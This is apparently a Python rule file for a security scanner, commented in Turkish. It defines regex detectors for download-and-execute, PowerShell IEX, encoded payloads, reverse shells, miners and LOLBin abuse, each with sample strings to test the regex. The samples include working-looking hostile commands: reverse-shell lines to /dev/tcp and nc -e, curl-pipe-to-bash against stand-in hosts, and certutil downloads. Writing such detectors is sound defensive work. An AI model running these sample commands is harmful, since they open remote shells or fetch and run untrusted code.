"""Kod çalıştırma / zararlı yazılım indirme kuralları.

Not: Bu dosyadaki `positives` örnekleri bilerek zararlı görünümlü METİNLERDİR;
hiçbiri çalıştırılmaz, yalnızca regex'in doğru eşleştiğini sınamak içindir.
"""
from .catalog import add
from .models import Severity as S

SHELLISH = ("shell", "makefile", "dockerfile", "yaml", "docs", "text", "batch", "config", "json")

add("RG-EXEC-001", "İndir ve doğrudan kabuğa ver (curl|sh)", S.HIGH, "high", "exec",
    r"\b(?:curl|wget|fetch)\b[^\n|;&]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b",
    "İnternetten indirilen içerik hiç incelenmeden kabukta çalışır; sunucu ele geçirilirse veya içerik değişirse tam sistem ele geçirilir.",
    "Betiği önce dosyaya indirin, okuyun, hash'ini doğrulayın; ancak sonra çalıştırın.",
    keywords=("curl", "wget", "fetch"), mitre=("T1105", "T1059.004"),
    positives=("curl -fsSL http://x.example/i.sh | bash", "wget -qO- http://a.b/c | sudo sh"),
    negatives=("curl -o file.sh http://x.example/i.sh", "echo curl | grep sh"))

add("RG-EXEC-002", "İndir ve Python/Node/Perl ile çalıştır", S.HIGH, "high", "exec",
    r"\b(?:curl|wget)\b[^\n|;&]{0,200}\|\s*(?:sudo\s+)?(?:python[0-9.]*(?!\s+-m\s+json|\s+-c\b)|node|perl|ruby|php)\b",   # `python -c "..."` stdin'i VERİ olarak okur
    "İndirilen kod doğrudan yorumlayıcıya verilir.", "İndirip inceleyin; doğrulamadan çalıştırmayın.",
    keywords=("curl", "wget"), mitre=("T1105", "T1059"),
    positives=("curl -s http://a.b/x.py | python3 -",), negatives=("curl http://a.b/x.json | jq .", "curl -s http://a.b/x | python3 -c 'import json,sys'"))

add("RG-EXEC-003", "PowerShell: indir ve çalıştır (IEX)", S.HIGH, "high", "exec",
    r"(?:\biex\b|invoke-expression)[^\n]{0,120}(?:downloadstring|downloadfile|invoke-webrequest|iwr|invoke-restmethod|irm|net\.webclient)"
    r"|(?:downloadstring|invoke-webrequest|iwr|invoke-restmethod|irm)\b[^\n]{0,160}\|\s*(?:iex|invoke-expression)\b",
    "Uzaktan indirilen PowerShell kodu bellekte çalışır (fileless saldırıların klasik yöntemi).",
    "Kaynağı doğrulamadan IEX kullanmayın.", keywords=("iex", "invoke-expression", "downloadstring", "iwr", "irm"),
    mitre=("T1059.001", "T1105"),
    positives=("iex (New-Object Net.WebClient).DownloadString('http://x/y.ps1')", "iwr http://x/y | iex"),
    negatives=("Get-ChildItem -Path .",))

add("RG-EXEC-004", "PowerShell gizli/atlamalı çalıştırma bayrakları", S.MEDIUM, "low", "exec",
    r"powershell(?:\.exe)?[^\n]{0,80}(?:-e(?:nc(?:odedcommand)?)?\s+[A-Za-z0-9+/=]{20,}|-w(?:indowstyle)?\s+hidden|-ep\s+bypass|-executionpolicy\s+bypass|-nop\b)",
    "Gizli pencere, politika atlatma veya Base64 komut. NOT: `-ExecutionPolicy Bypass` meşru kurulum betiklerinde de sık görülür; bağlama bakın.",
    "Komutun gerçek içeriğini çözüp inceleyin.", keywords=("powershell",), mitre=("T1059.001", "T1027"),
    positives=("powershell -nop -w hidden -enc aGVsbG8gd29ybGQgaGVsbG8gd29ybGQ=",),
    negatives=("powershell Get-Date",))

add("RG-EXEC-005", "Base64 çöz ve kabuğa ver", S.HIGH, "high", "obfuscation",
    r"base64\s+(?:-d|--decode|-D)\b[^\n]{0,80}\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b|\|\s*base64\s+(?:-d|--decode)[^\n]{0,60}\|\s*(?:ba|z)?sh\b",
    "Gizlenmiş (kodlanmış) yük çözülüp çalıştırılıyor; amaç içeriği gözden saklamaktır.",
    "Çözülen içeriği çalıştırmadan okuyun.", keywords=("base64",), mitre=("T1027", "T1059.004"),
    positives=("echo aGVsbG8= | base64 -d | bash",), negatives=("base64 -d file.b64 > out.bin",))

add("RG-EXEC-006", "Python: exec/eval ile kodlanmış yük", S.HIGH, "high", "obfuscation",
    r"\b(?:exec|eval)\s*\(\s*(?:__import__\(['\"]base64['\"]\)\.b64decode|base64\.b64decode|zlib\.decompress|codecs\.decode|bytes\.fromhex|marshal\.loads|binascii\.unhexlify|compile\()",
    "Kod, çalışma anında çözülüp yürütülüyor: statik incelemeden kaçmanın tipik yolu.",
    "exec/eval içine giren veriyi çözüp okuyun.", keywords=("exec", "eval"), langs=("python", "text", "pth"),
    mitre=("T1027", "T1059.006"),
    positives=("exec(base64.b64decode('cHJpbnQoMSk='))", "exec(zlib.decompress(x))"),
    negatives=("eval(compile_regex)", "exec_count = 3"))

add("RG-EXEC-007", "JavaScript: eval/Function ile kodlanmış yük", S.HIGH, "medium", "obfuscation",
    r"\b(?:eval|new\s+Function)\s*\(\s*(?:atob\(|Buffer\.from\([^)]{0,120}base64|unescape\(|String\.fromCharCode)",
    "Kod, çalışma anında çözülüp yürütülüyor.", "Çözülen yükü okuyun.", keywords=("eval", "function"),
    langs=("js", "text", "json"), mitre=("T1027", "T1059.007"),
    positives=("eval(atob('YWxlcnQoMSk='))", "eval(Buffer.from(s,'base64').toString())"),
    negatives=("eval(someVar)",))

add("RG-EXEC-008", "Ters kabuk (reverse shell) kalıbı", S.CRITICAL, "high", "exec",
    r"/dev/(?:tcp|udp)/[\w.\-]{1,100}/\d{1,5}|\bnc(?:at)?\b[^\n]{0,40}\s-e\s+/?\S*sh\b|\bbash\s+-i\s*>&?\s*/dev/tcp|\bmkfifo\b[^\n]{0,60}\bnc\b|socket\.socket\([^\n]{0,200}(?:dup2|subprocess)|\bpty\.spawn\(\s*['\"](?:/bin/)?(?:ba)?sh",
    "Saldırgana uzaktan komut satırı erişimi veren klasik ters kabuk kalıbı.",
    "Bu kodu çalıştırmayın; kaynağını bildirin.", keywords=("/dev/tcp", "/dev/udp", "nc ", "ncat", "mkfifo", "pty.spawn", "socket."),
    mitre=("T1059", "T1571"),
    positives=("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444", "pty.spawn('/bin/bash')"),
    negatives=("nc -zv host 22", "socket.socket(AF_INET)"))

add("RG-EXEC-009", "Kripto madenci göstergesi", S.HIGH, "medium", "malware",
    r"stratum\+(?:tcp|ssl)://|\b(?:xmrig|minerd|cpuminer|nicehash|ethminer|nbminer)\b|\bcryptonight\b|pool\.(?:minexmr|supportxmr|nanopool|hashvault)\.",
    "Madencilik havuzu/araç adı: kaynaklarınızı izinsiz kullanan yazılım olabilir.",
    "Beklenmiyorsa kaldırın.", keywords=("stratum", "xmrig", "minerd", "cpuminer", "nicehash", "ethminer", "nbminer", "cryptonight", "pool."),
    mitre=("T1496",),
    positives=("stratum+tcp://pool.example:3333", "./xmrig -o x"), negatives=("minerals and metals",))

add("RG-EXEC-010", "Chmod +x ardından hemen çalıştırma (indirilen dosya)", S.MEDIUM, "low", "exec",
    r"(?:curl|wget)\b[^\n]{0,160}(?:-o|-O|>)\s*(/tmp/\S+|/var/tmp/\S+|/dev/shm/\S+)[^\n]{0,40}(?:&&|;)\s*chmod\s+\+?[0-7x]+\s+\1",
    "Geçici dizine indirilen dosyanın çalıştırılabilir yapılması; yaygın zararlı dağıtım kalıbı.",
    "İndirilen dosyayı doğrulayın.", keywords=("chmod",), mitre=("T1105", "T1222"),
    positives=("curl -o /tmp/x http://a/b && chmod +x /tmp/x",), negatives=("chmod +x ./build.sh",))

add("RG-EXEC-011", "Windows LOLBin ile indirme/çalıştırma", S.HIGH, "medium", "exec",
    r"\bcertutil(?:\.exe)?\b[^\n]{0,60}-urlcache|\bbitsadmin\b[^\n]{0,60}/transfer|\bmshta(?:\.exe)?\s+(?:https?:|vbscript:|javascript:)|\bregsvr32\b[^\n]{0,40}/i:https?:|rundll32[^\n]{0,60}javascript:",
    "Windows'un meşru araçları kötüye kullanılarak dosya indirilir/çalıştırılır.",
    "Kullanım amacını doğrulayın.", keywords=("certutil", "bitsadmin", "mshta", "regsvr32", "rundll32"),
    mitre=("T1218", "T1105"),
    positives=("certutil -urlcache -f http://a/b.exe b.exe", "mshta http://a/b.hta"), negatives=("certutil -hashfile a SHA256",))

add("RG-EXEC-012", "Python: subprocess/os.system ile indirilen komut", S.MEDIUM, "low", "exec",
    r"\b(?:os\.system|subprocess\.(?:run|Popen|call|check_output))\s*\([^\n]{0,120}\b(?:curl|wget)\b[^\n]{0,120}\|\s*(?:ba)?sh",
    "Python içinden indir-ve-çalıştır.", "Gerekçesini doğrulayın.", keywords=("os.system", "subprocess"),
    langs=("python", "text"), mitre=("T1059.006",),
    positives=("os.system('curl http://a/b | sh')",), negatives=("subprocess.run(['ls'])",))
